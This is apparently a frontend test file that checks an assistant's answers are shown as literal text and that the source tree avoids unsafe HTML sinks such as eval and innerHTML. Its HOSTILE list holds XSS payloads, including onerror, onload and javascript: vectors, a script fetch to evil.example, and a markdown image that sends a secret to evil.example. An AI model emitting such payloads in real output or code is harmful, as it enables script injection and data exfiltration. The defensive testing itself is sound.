// Model output is plain text on screen: markdown, HTML, links and data URLs in an answer never
// become live elements, so a hostile answer cannot load a remote image, run script or leak data.
// A second check keeps unsafe HTML sinks out of the app source.

import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { render } from "@testing-library/react";
import type { AiResultDto } from "../ipc/generated/AiResultDto";
import { ResultView } from "./Conversation";

vi.mock("../ipc/client", () => ({
  OpError: class extends Error {},
  inTauri: () => false,
  onAppEvent: () => Promise.resolve(() => undefined),
  call: vi.fn(async () => null),
}));

const HOSTILE = [
  "![x](https://evil.example/c?d=SECRET)",
  "[click](https://evil.example/)",
  '<img src="https://evil.example/p.png" onerror="alert(1)">',
  '<a href="javascript:alert(1)">x</a>',
  '<iframe src="https://evil.example"></iframe>',
  "<script>fetch('https://evil.example')</script>",
  "<svg onload=alert(1)>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
];

function result(kind: AiResultDto["kind"], texts: string[]): AiResultDto {
  return {
    id: "r1", kind, status: "Informational", content: texts.join(" "), details: texts,
    confidence: null, provenance: [], items: texts.map((label) => ({ label, detail: label, nav: null })), itemsAreAnswer: false,
    nav: null, changeSet: null, errorCode: null, steps: [], taskId: null, createdAt: 1,
  } as AiResultDto;
}

describe("assistant answers are never live HTML", () => {
  for (const kind of ["Answer", "Suggestion", "Denied", "Failed"] as const) {
    it(`shows hostile ${kind} text as literal text`, () => {
      const plain = render(<ResultView r={result(kind, ["hello"])} onChanged={() => undefined} />);
      const baseSvg = plain.container.querySelectorAll("svg").length;
      plain.unmount();

      const { container } = render(<ResultView r={result(kind, HOSTILE)} onChanged={() => undefined} />);
      for (const tag of ["img", "iframe", "script", "object", "embed", "a"]) {
        expect(container.querySelectorAll(tag).length, tag).toBe(0);
      }
      expect(container.querySelectorAll("svg").length).toBe(baseSvg);
      expect(container.querySelector("[onerror], [onload]")).toBeNull();
      const text = container.textContent ?? "";
      for (const s of HOSTILE) expect(text, s).toContain(s);
    });
  }
});

describe("source tree has no unsafe HTML sinks", () => {
  const root = join(__dirname, "..");
  const files = (dir: string): string[] =>
    readdirSync(dir).flatMap((n) => {
      const p = join(dir, n);
      if (statSync(p).isDirectory()) return files(p);
      return /\.(ts|tsx)$/.test(n) && !/\.test\./.test(n) ? [p] : [];
    });
  const banned = ["dangerouslySetInnerHTML", ".innerHTML =", "insertAdjacentHTML", "document.write", /\bnew Function\(/, /\beval\(/];

  it("uses none of the banned calls", () => {
    const list = files(root);
    expect(list.length).toBeGreaterThan(50);
    const hits = list.flatMap((f) => {
      const src = readFileSync(f, "utf8");
      return banned.filter((b) => (typeof b === "string" ? src.includes(b) : b.test(src))).map((b) => `${f}: ${b}`);
    });
    expect(hits).toEqual([]);
  });
});
